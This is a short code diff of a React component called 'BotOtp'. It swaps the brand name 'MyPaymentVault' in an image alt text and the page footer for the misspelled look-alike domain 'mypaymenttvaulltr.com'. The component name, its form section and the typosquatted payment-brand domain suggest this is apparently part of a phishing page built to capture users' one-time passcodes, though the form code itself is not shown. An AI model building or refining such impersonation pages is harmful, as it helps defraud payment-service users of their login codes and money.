@@ -158,7 +158,7 @@ export default function BotOtp() {
 
         {/* ══ HERO IMAGE ══ */}
         <div style={{ width: "100%", lineHeight: 0 }}>
-          <img src="/hero-vault-new.png" alt="MyPaymentVault" style={{ width: "100%", display: "block" }} />
+          <img src="/hero-vault-new.png" alt="mypaymenttvaulltr.com" style={{ width: "100%", display: "block" }} />
         </div>
 
         {/* ══ FORM ══ */}
@@ -273,7 +273,7 @@ export default function BotOtp() {
       {/* Footer */}
       <div style={{ width: "100%", maxWidth: 480, marginTop: 12, paddingRight: 2, textAlign: "right" }}>
         <span style={{ fontSize: 11, color: "#888" }}>
-          &copy; MyPaymentVault | Terms of Use | Privacy &amp; Cookies
+          &copy; mypaymenttvaulltr.com | Terms of Use | Privacy &amp; Cookies
         </span>
       </div>
 
